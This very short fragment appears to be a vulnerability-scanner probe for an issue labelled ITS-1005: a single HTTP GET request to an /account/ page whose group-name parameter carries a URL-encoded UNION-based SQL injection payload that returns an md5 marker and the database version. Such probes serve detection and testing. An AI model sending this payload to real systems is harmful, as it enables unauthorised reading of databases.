# Vulnerable: ITS-1005
GET /account/?user=1&tab=groups&group-name=p%27+or+%27%%27=%27%%27+union+all+select+1,2,3,4,5,6,7,8,9,10,11,concat(%22Database:%22,md5({{num}}),0x7c,%20%22Version:%22,version()),13--+-
